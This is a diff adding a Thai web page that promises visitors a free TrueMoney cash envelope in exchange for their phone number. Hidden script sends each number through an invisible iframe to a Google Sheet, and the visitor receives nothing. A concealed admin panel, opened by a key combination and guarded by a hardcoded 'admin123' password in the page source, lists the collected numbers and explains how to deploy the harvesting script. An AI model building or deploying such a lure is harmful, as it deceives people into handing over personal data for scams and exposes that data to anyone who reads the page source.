@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ออนไลน์ *** - ส่งซองทรูมันนี่ให้คุณ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a1a;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .illustration {
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            color: #cccccc;
+            margin-bottom: 40px;
+        }
+        
+        .form-group {
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        input[type="tel"], input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 15px;
+            background: #2a2a2a;
+            border: 1px solid #3a3a3a;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            letter-spacing: 1px;
+        }
+        
+        input[type="tel"]:focus, input[type="password"]:focus, input[type="text"]:focus {
+            outline: none;
+            border-color: #ff8c00;
+        }
+        
+        input[type="tel"]::placeholder, input[type="password"]::placeholder, input[type="text"]::placeholder {
+            color: #666666;
+        }
+        
+        .links {
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .links a {
+            color: #4a9eff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #ff6b35 0%, #f7931a 100%);
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 107, 53, 0.4);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Admin Panel Styles */
+        .admin-panel {
+            display: none;
+            max-width: 900px;
+            width: 100%;
+            padding: 30px;
+            background: #2a2a2a;
+            border-radius: 12px;
+            border: 2px solid #ff6b35;
+        }
+
+        .admin-panel.active {
+            display: block;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #3a3a3a;
+        }
+
+        .admin-header h2 {
+            color: #ff6b35;
+            font-size: 24px;
+        }
+
+        .logout-btn {
+            padding: 10px 20px;
+            background: #ff4444;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .logout-btn:hover {
+            background: #cc0000;
+        }
+
+        .admin-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .tab-btn {
+            padding: 12px 24px;
+            background: #1a1a1a;
+            border: 1px solid #3a3a3a;
+            border-radius: 8px;
+            color: #cccccc;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: #ff6b35;
+            color: white;
+            border-color: #ff6b35;
+        }
+
+        .tab-btn:hover {
+            border-color: #ff6b35;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 8px;
+            border-left: 4px solid #f7931a;
+        }
+
+        .stat-card .label {
+            color: #888888;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .stat-card .value {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .data-list {
+            background: #1a1a1a;
+            border-radius: 8px;
+            padding: 20px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .data-list h3 {
+            margin-bottom: 15px;
+            color: #f7931a;
+        }
+
+        .data-item {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: #2a2a2a;
+            border-radius: 5px;
+            border-left: 3px solid #ff6b35;
+        }
+
+        .data-item .time {
+            color: #888888;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .data-item .phone {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #888888;
+        }
+
+        .setup-section {
+            background: #1a1a1a;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .setup-section h3 {
+            color: #ff6b35;
+            margin-bottom: 20px;
+        }
+
+        .setup-section ol {
+            margin-left: 20px;
+            line-height: 1.8;
+            color: #cccccc;
+        }
+
+        .setup-section li {
+            margin-bottom: 10px;
+        }
+
+        .setup-section code {
+            background: #2a2a2a;
+            padding: 2px 8px;
+            border-radius: 3px;
+            color: #4a9eff;
+            font-family: monospace;
+            font-size: 13px;
+        }
+
+        .code-box {
+            background: #2a2a2a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border: 1px solid #3a3a3a;
+        }
+
+        .code-box textarea {
+            width: 100%;
+            min-height: 200px;
+            background: #1a1a1a;
+            color: #4a9eff;
+            border: none;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            padding: 10px;
+            resize: vertical;
+        }
+
+        .url-input-group {
+            margin-top: 20px;
+        }
+
+        .url-input-group input {
+            font-family: monospace;
+            font-size: 14px;
+        }
+
+        .save-btn {
+            margin-top: 10px;
+            padding: 12px;
+            background: #4CAF50;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .save-btn:hover {
+            background: #45a049;
+        }
+
+        .status-msg {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        .status-msg.success {
+            background: #4CAF50;
+            color: white;
+        }
+
+        .status-msg.error {
+            background: #ff4444;
+            color: white;
+        }
+
+        .warning-box {
+            background: #ff4444;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .info-box {
+            background: #2a4a7c;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+
+        .admin-login {
+            display: none;
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #2a2a2a;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #3a3a3a;
+            z-index: 1000;
+        }
+
+        .admin-login input {
+            width: 150px;
+            padding: 8px;
+            margin-right: 5px;
+            background: #1a1a1a;
+            border: 1px solid #3a3a3a;
+            border-radius: 5px;
+            color: white;
+            font-size: 12px;
+        }
+
+        .admin-login button {
+            padding: 8px 15px;
+            background: #ff6b35;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .refresh-btn {
+            padding: 10px 20px;
+            background: #4a9eff;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .refresh-btn:hover {
+            background: #3a7fd5;
+        }
+    </style>
+</head>
+<body>
+    <!-- Admin Login (Hidden, press Ctrl+Shift+A to show) -->
+    <div class="admin-login" id="adminLogin">
+        <input type="password" id="adminPassword" placeholder="Admin Password">
+        <button onclick="adminLogin()">Login</button>
+    </div>
+
+    <!-- Main Form (Public) -->
+    <div class="container" id="mainForm">
+        <div class="illustration">
+            <svg width="300" height="300" viewBox="0 0 300 300">
+                <ellipse cx="150" cy="260" rx="80" ry="15" fill="#333"/>
+                <rect x="120" y="180" width="60" height="80" rx="5" fill="#ff8c00"/>
+                <circle cx="150" cy="100" r="40" fill="#d4a574"/>
+                <path d="M 110 100 Q 110 60, 150 60 Q 190 60, 190 100 L 190 130 Q 190 140, 180 140 L 120 140 Q 110 140, 110 130 Z" fill="#8b4513"/>
+                <circle cx="135" cy="95" r="5" fill="#000"/>
+                <circle cx="165" cy="95" r="5" fill="#000"/>
+                <path d="M 140 110 Q 150 115, 160 110" stroke="#000" stroke-width="2" fill="none"/>
+                
+                <circle cx="130" cy="220" r="20" fill="#f7931a"/>
+                <text x="130" y="228" text-anchor="middle" fill="#fff" font-size="20">₿</text>
+                <circle cx="170" cy="230" r="20" fill="#f7931a"/>
+                <text x="170" y="238" text-anchor="middle" fill="#fff" font-size="20">₿</text>
+                <circle cx="150" cy="240" r="20" fill="#f7931a"/>
+                <text x="150" y="248" text-anchor="middle" fill="#fff" font-size="20">₿</text>
+                
+                <rect x="60" y="80" width="40" height="70" rx="5" fill="#fff" stroke="#333" stroke-width="2"/>
+                <circle cx="80" cy="160" r="5" fill="#333"/>
+                <circle cx="50" cy="50" r="20" fill="#ff4444"/>
+                <path d="M 50 45 L 55 55 L 50 52 L 45 55 Z" fill="#fff"/>
+                
+                <circle cx="230" cy="80" r="30" fill="#f7931a"/>
+                <text x="230" y="95" text-anchor="middle" fill="#fff" font-size="35" font-weight="bold">₿</text>
+            </svg>
+        </div>
+        
+        <h1>ออนไลน์ ***</h1>
+        <p class="subtitle">ส่งซองทรูมันนี่ให้คุณ</p>
+        
+        <div class="form-group">
+            <label for="phone">กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
+            <input type="tel" id="phone" placeholder="08x-xxx-xxxx" maxlength="12">
+        </div>
+        
+        <div class="links">
+            <span>หากคุณยังไม่มีบัญชีทรูมันนี่ 
+                <a href="#">สมัครสมาชิกที่นี่</a>
+            </span>
+            <br><br>
+            <a href="#">ดูรายละเอียดซอง</a>
+        </div>
+        
+        <button class="submit-btn" onclick="submitPhone()" id="submitBtn">รับซองเลย</button>
+    </div>
+
+    <!-- Admin Panel -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-header">
+            <h2>🔧 Admin Panel</h2>
+            <button class="logout-btn" onclick="adminLogout()">Logout</button>
+        </div>
+
+        <div class="admin-tabs">
+            <button class="tab-btn active" onclick="switchTab('data')">📊 ข้อมูล</button>
+            <button class="tab-btn" onclick="switchTab('setup')">⚙️ ตั้งค่า</button>
+        </div>
+
+        <!-- Data Tab -->
+        <div class="tab-content active" id="dataTab">
+            <button class="refresh-btn" onclick="loadSheetData()">🔄 รีเฟรชข้อมูล</button>
+            
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="label">เบอร์ที่บันทึกทั้งหมด</div>
+                    <div class="value" id="totalCount">-</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">สถานะ</div>
+                    <div class="value" id="statusText" style="font-size: 18px;">-</div>
+                </div>
+            </div>
+
+            <div class="data-list">
+                <h3>📋 รายการเบอร์ที่บันทึก</h3>
+                <div id="phoneList">
+                    <div class="empty-state">
+                        <p>กด "รีเฟรชข้อมูล" เพื่อโหลดข้อมูลจาก Google Sheets</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Setup Tab -->
+        <div class="tab-content" id="setupTab">
+            <div class="warning-box">
+                ⚠️ <strong>สำคัญ:</strong> ต้องตั้งค่า Google Apps Script ก่อนถึงจะบันทึกข้อมูลได้!
+            </div>
+
+            <div class="setup-section">
+                <h3>📝 ขั้นตอนการตั้งค่า Google Sheets</h3>
+                <ol>
+                    <li>เปิด <a href="https://sheets.google.com" target="_blank" style="color: #4a9eff;">Google Sheets</a> สร้าง Spreadsheet ใหม่</li>
+                    <li>ตั้งชื่อหัวตาราง: <code>Timestamp</code>, <code>Phone</code> ในแถวแรก (A1, B1)</li>
+                    <li>ไปที่ <strong>Extensions → Apps Script</strong></li>
+                    <li>ลบโค้ดเดิมออก แล้ววางโค้ดนี้:</li>
+                </ol>
+
+                <div class="code-box">
+                    <textarea readonly onclick="this.select()">function doPost(e) {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  
+  // Handle both JSON and form data
+  var phone, timestamp;
+  
+  if (e.postData && e.postData.type === 'application/json') {
+    var data = JSON.parse(e.postData.contents);
+    phone = data.phone;
+    timestamp = data.timestamp;
+  } else {
+    phone = e.parameter.phone;
+    timestamp = e.parameter.timestamp;
+  }
+  
+  sheet.appendRow([
+    new Date(timestamp),
+    phone
+  ]);
+  
+  return ContentService
+    .createTextOutput(JSON.stringify({success: true}))
+    .setMimeType(ContentService.MimeType.JSON);
+}
+
+function doGet(e) {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  var data = sheet.getDataRange().getValues();
+  
+  // Skip header row
+  var phones = [];
+  for (var i = 1; i < data.length; i++) {
+    phones.push({
+      timestamp: data[i][0],
+      phone: data[i][1]
+    });
+  }
+  
+  return ContentService
+    .createTextOutput(JSON.stringify({data: phones}))
+    .setMimeType(ContentService.MimeType.JSON);
+}</textarea>
+                </div>
+
+                <ol start="5">
+                    <li>กด <strong>💾 Save</strong></li>
+                    <li>กด <strong>Deploy → New deployment</strong></li>
+                    <li>⚠️ <strong>ถ้าเคย Deploy แล้ว ให้กด "Manage deployments" → ไอคอนเฟือง → "New version" → Deploy</strong></li>
+                    <li>เลือก type: <strong>Web app</strong></li>
+                    <li>ตั้งค่า:
+                        <ul style="margin-top: 8px;">
+                            <li>Execute as: <strong>Me</strong></li>
+                            <li>Who has access: <strong>Anyone</strong></li>
+                        </ul>
+                    </li>
+                    <li>กด <strong>Deploy</strong></li>
+                    <li>คัดลอก <strong>Web app URL</strong> (จะขึ้นต้นด้วย https://script.google.com/...)</li>
+                    <li>วาง URL ด้านล่างนี้:</li>
+                </ol>
+
+                <div class="url-input-group">
+                    <label for="scriptUrl" style="color: #f7931a; font-weight: bold; display: block; margin-bottom: 10px;">
+                        🔗 Google Apps Script Web App URL:
+                    </label>
+                    <input type="text" id="scriptUrl" placeholder="https://script.google.com/macros/s/xxxxx/exec">
+                    <button class="save-btn" onclick="saveScriptUrl()">💾 บันทึก URL</button>
+                    <div id="saveStatus"></div>
+                </div>
+
+                <div class="info-box">
+                    💡 <strong>หมายเหตุ:</strong> หลังตั้งค่าเสร็จแล้ว ทุกครั้งที่มีคนกรอกเบอร์จะบันทึกลง Google Sheets อัตโนมัติ และคุณสามารถดูข้อมูลได้ในแท็บ "ข้อมูล"
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = 'admin123';
+        let SCRIPT_URL = localStorage.getItem('googleScriptUrl') || '';
+        let currentTab = 'data';
+
+        // Load saved URL on admin panel load
+        if (SCRIPT_URL) {
+            document.getElementById('scriptUrl').value = SCRIPT_URL;
+        }
+
+        // Keyboard shortcut (Ctrl+Shift+A)
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+                const adminLogin = document.getElementById('adminLogin');
+                adminLogin.style.display = adminLogin.style.display === 'none' ? 'block' : 'none';
+            }
+        });
+
+        function adminLogin() {
+            const password = document.getElementById('adminPassword').value;
+            if (password === ADMIN_PASSWORD) {
+                document.getElementById('mainForm').style.display = 'none';
+                document.getElementById('adminPanel').classList.add('active');
+                document.getElementById('adminLogin').style.display = 'none';
+                
+                if (SCRIPT_URL) {
+                    loadSheetData();
+                }
+            } else {
+                alert('❌ รหัสผ่านไม่ถูกต้อง!');
+            }
+        }
+
+        function adminLogout() {
+            document.getElementById('mainForm').style.display = 'block';
+            document.getElementById('adminPanel').classList.remove('active');
+            document.getElementById('adminPassword').value = '';
+        }
+
+        function switchTab(tab) {
+            currentTab = tab;
+            
+            // Update tab buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Update tab content
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.getElementById(tab + 'Tab').classList.add('active');
+        }
+
+        function saveScriptUrl() {
+            const url = document.getElementById('scriptUrl').value.trim();
+            const statusDiv = document.getElementById('saveStatus');
+            
+            if (!url) {
+                statusDiv.innerHTML = '<div class="status-msg error">❌ กรุณาใส่ URL</div>';
+                return;
+            }
+            
+            if (!url.includes('script.google.com')) {
+                statusDiv.innerHTML = '<div class="status-msg error">❌ URL ไม่ถูกต้อง ต้องเป็น Google Apps Script URL</div>';
+                return;
+            }
+            
+            localStorage.setItem('googleScriptUrl', url);
+            SCRIPT_URL = url;
+            statusDiv.innerHTML = '<div class="status-msg success">✅ บันทึก URL สำเร็จ! ตอนนี้ระบบพร้อมใช้งาน</div>';
+            
+            setTimeout(() => {
+                statusDiv.innerHTML = '';
+            }, 3000);
+        }
+
+        async function loadSheetData() {
+            if (!SCRIPT_URL) {
+                document.getElementById('statusText').textContent = 'ยังไม่ได้ตั้งค่า';
+                document.getElementById('phoneList').innerHTML = `
+                    <div class="empty-state">
+                        <p>❌ กรุณาไปที่แท็บ "ตั้งค่า" เพื่อตั้งค่า Google Sheets URL ก่อน</p>
+                    </div>
+                `;
+                return;
+            }
+
+            document.getElementById('statusText').textContent = 'กำลังโหลด...';
+            
+            try {
+                const response = await fetch(SCRIPT_URL);
+                const result = await response.json();
+                
+                if (result.data && result.data.length > 0) {
+                    document.getElementById('totalCount').textContent = result.data.length;
+                    document.getElementById('statusText').textContent = '✅ เชื่อมต่อแล้ว';
+                    
+                    const phoneListDiv = document.getElementById('phoneList');
+                    phoneListDiv.innerHTML = '';
+                    
+                    result.data.reverse().forEach(item => {
+                        const itemDiv = document.createElement('div');
+                        itemDiv.className = 'data-item';
+                        const date = new Date(item.timestamp);
+                        itemDiv.innerHTML = `
+                            <div class="time">🕐 ${date.toLocaleString('th-TH')}</div>
+                            <div class="phone">📱 ${item.phone}</div>
+                        `;
+                        phoneListDiv.appendChild(itemDiv);
+                    });
+                } else {
+                    document.getElementById('totalCount').textContent = '0';
+                    document.getElementById('statusText').textContent = '✅ เชื่อมต่อแล้ว';
+                    document.getElementById('phoneList').innerHTML = `
+                        <div class="empty-state">
+                            <p>ยังไม่มีข้อมูล</p>
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                console.error('Error loading data:', error);
+                document.getElementById('statusText').textContent = '❌ เกิดข้อผิดพลาด';
+                document.getElementById('phoneList').innerHTML = `
+                    <div class="empty-state">
+                        <p>❌ ไม่สามารถโหลดข้อมูลได้<br>กรุณาตรวจสอบ URL ในแท็บ "ตั้งค่า"</p>
+                    </div>
+                `;
+            }
+        }
+
+        async function submitPhone() {
+            const phoneInput = document.getElementById('phone');
+            const phone = phoneInput.value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            if (!phone) {
+                alert('กรุณากรอกเบอร์โทรศัพท์');
+                return;
+            }
+
+            if (!SCRIPT_URL) {
+                phoneInput.value = '';
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'กำลังส่ง...';
+            
+            try {
+                // Use iframe method to bypass CORS
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                const form = iframe.contentWindow.document.createElement('form');
+                form.method = 'POST';
+                form.action = SCRIPT_URL;
+                
+                const phoneField = iframe.contentWindow.document.createElement('input');
+                phoneField.type = 'hidden';
+                phoneField.name = 'phone';
+                phoneField.value = phone;
+                form.appendChild(phoneField);
+                
+                const timestampField = iframe.contentWindow.document.createElement('input');
+                timestampField.type = 'hidden';
+                timestampField.name = 'timestamp';
+                timestampField.value = new Date().toISOString();
+                form.appendChild(timestampField);
+                
+                iframe.contentWindow.document.body.appendChild(form);
+                form.submit();
+                
+                // Clean up after 2 seconds
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 2000);
+                
+                phoneInput.value = '';
+                
+            } catch (error) {
+                console.error('Error:', error);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'รับซองเลย';
+            }
+        }
+
+        document.getElementById('phone').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitPhone();
+            }
+        });
+
+        document.getElementById('adminPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                adminLogin();
+            }
+        });
+        
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 10) {
+                value = value.substring(0, 10);
+            }
+            
+            if (value.length > 6) {
+                value = value.substring(0, 3) + '-' + value.substring(3, 6) + '-' + value.substring(6);
+            } else if (value.length > 3) {
+                value = value.substring(0, 3) + '-' + value.substring(3);
+            }
+            
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
